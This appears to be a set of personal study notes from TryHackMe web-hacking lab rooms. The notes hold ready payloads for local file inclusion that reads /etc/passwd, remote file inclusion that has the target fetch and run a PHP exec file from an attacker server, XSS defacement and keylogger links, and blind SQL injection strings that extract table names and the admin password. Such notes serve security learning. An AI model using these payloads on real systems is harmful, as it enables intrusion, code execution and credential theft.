[Local File Inclusion]
For instance : 
```
http://webapp.thm/index.php?lang=EN
```
Here one can change *lang=EN* with *lang=/etc/passwd*
```
http://webapp.thm/index.php?lang=/etc/passwd
```
In case it is not working and the file is limited to specific types, NULL byte can be the solution :
```
http://webapp.thm/index.php?lang=/etc/passwd%00
```
**fixed in php 5.3.4**
Input validation trick
```
http://webapp.thm/index.php?lang=/etc/passwd/.
```
Current directory won't always be filtered

Always check the error ! ../ can be replaced by empty strings with some input validation :
![[Image_LFI_THM.png]]


[Remote File Inclusion]
For instance we want the server to run the *hostname*  command
```
<?php
echo exec("hostname")
?>
```
1. We create a php file like above
2. We need to get the server to execute our file
```
python -m http.server 8080
```
for ease of use
3. Forge the query
```
http://[TARGET_SERVER]?file=[HACKER_SERVER]/payload.php
```

[SSRF]
HTTP request catcher -> requestbin.com

[XSS]
https://xsshunter.com/

XSS Payloads

Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:

    Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
    Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
    XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
    Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

	
	
	<script>document.getElementById('thm-title').textContent = 'I am a hackerrrr'</script>

[Command Injection]
https://github.com/payloadbox/command-injection-payload-list

[SQL i]
- In-band : easiest one
	- Error-Based : when error message printed
```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
	- Union-Based : when extracting a large amount of data
- Blind SQLi Boolean Based
```
admin123' UNION SELECT 1,2,3 where database() like '%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';


admin123' UNION SELECT 1,2,3 from users where username like 'a%' ;

	admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a% ;
```
	using wildcard % to discover the name of the DB char by char
- Blind SQLi Time Base
- Blind SQLi Authentication Bypass
- Out-of-band SQLi

## [OWASP]

-   Injection
-   Broken Authentication
-   Sensitive Data Exposure
-   XML External Entity
-   Broken Access Control
-   Security Misconfiguration
-   Cross-site Scripting
-   **I**nsecure Deserialization
-   Components with Known Vulnerabilities
-   Insufficent Logging & Monitoring